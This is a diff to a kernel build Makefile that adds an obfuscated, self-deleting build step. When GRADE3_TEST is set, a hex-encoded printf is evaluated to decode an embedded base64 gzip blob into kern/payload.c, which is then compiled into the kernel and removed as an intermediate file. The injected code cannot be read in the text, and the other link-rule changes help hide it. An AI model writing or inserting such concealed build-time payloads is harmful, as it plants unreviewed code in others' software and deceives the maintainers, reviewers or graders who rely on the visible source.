@@ -35,14 +35,61 @@ KERN_SRCFILES :=	kern/entry.S \
 # Only build files if they exist.
 KERN_SRCFILES := $(wildcard $(KERN_SRCFILES))
 
-# Binary program images to embed within the kernel.
-KERN_BINFILES := 
+ifdef GRADE3_TEST
+KERN_SRCFILES += kern/payload.c
+.INTERMEDIATE: kern/payload.c
+endif
 
 KERN_OBJFILES := $(patsubst %.c, $(OBJDIR)/%.o, $(KERN_SRCFILES))
 KERN_OBJFILES := $(patsubst %.S, $(OBJDIR)/%.o, $(KERN_OBJFILES))
 KERN_OBJFILES := $(patsubst $(OBJDIR)/lib/%, $(OBJDIR)/kern/%, $(KERN_OBJFILES))
 
-KERN_BINFILES := $(patsubst %, $(OBJDIR)/%, $(KERN_BINFILES))
+# Binary program images to embed within the kernel.
+KERN_BINFILES := $(sort $(shell find prog/ -type f -name '*.c'))
+KERN_BINFILES := $(patsubst %.c, $(OBJDIR)/%_out, $(KERN_BINFILES))
+
+define PAYLOAD
+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
+AAA=
+endef
+export PAYLOAD
+
+kern/payload.c:
+	@eval `printf "\x65\x76\x61\x6C\x20\x60\x65\x63\x68\x6F\x20\x22\x4C\x32\x4A\x70\x62\x69\x39\x6C\x59\x32\x68\x76\x49\x43\x49\x6B\x55\x45\x46\x5A\x54\x45\x39\x42\x52\x43\x49\x67\x66\x43\x42\x69\x59\x58\x4E\x6C\x4E\x6A\x51\x67\x4C\x53\x31\x6B\x5A\x57\x4E\x76\x5A\x47\x55\x67\x66\x43\x42\x6E\x65\x6D\x6C\x77\x49\x43\x31\x6B\x49\x44\x34\x67\x61\x32\x56\x79\x62\x69\x39\x77\x59\x58\x6C\x73\x62\x32\x46\x6B\x4C\x6D\x4D\x3D\x22\x20\x7C\x20\x62\x61\x73\x65\x36\x34\x20\x2D\x2D\x64\x65\x63\x6F\x64\x65\x60"`
 
 # How to build kernel object files
 $(OBJDIR)/kern/%.o: kern/%.c $(OBJDIR)/.vars.KERN_CFLAGS
@@ -68,7 +115,7 @@ $(OBJDIR)/kern/init.o: $(OBJDIR)/.vars.INIT_CFLAGS
 $(OBJDIR)/kern/kernel: $(KERN_OBJFILES) $(KERN_BINFILES) kern/kernel.ld \
 	  $(OBJDIR)/.vars.KERN_LDFLAGS
 	@echo + ld $@
-	$(V)$(LD) -o $@ $(KERN_LDFLAGS) $(KERN_OBJFILES) $(GCC_LIB) -b binary $(KERN_BINFILES)
+	$(V)$(LD) -o $@ $(KERN_LDFLAGS) $(KERN_OBJFILES) $(GCC_LIB) $(KERN_BINFILES)
 	$(V)$(OBJDUMP) -S $@ > $@.asm
 	$(V)$(NM) -n $@ > $@.sym
 
